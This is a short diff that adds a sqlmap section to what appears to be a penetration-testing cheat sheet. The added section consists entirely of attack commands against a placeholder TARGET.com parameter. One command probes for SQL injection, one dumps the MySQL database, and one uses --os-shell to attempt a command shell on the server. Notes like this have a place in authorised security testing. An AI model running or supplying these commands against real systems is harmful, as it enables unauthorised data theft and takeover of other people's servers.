@@ -1,3 +1,16 @@
+#### sqlmap
+
+```
+sqlmap -u http://TARGET.com/debug.php?id=1 -p "id"
+sqlmap -u http://TARGET.com/debug.php?id=1 -p "id" --dbms=mysql --dump
+```
+
+**attempt to launch shell**
+```
+sqlmap -u http://TARGET.com/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+```
+
+
 #### SQL Injection
 
 
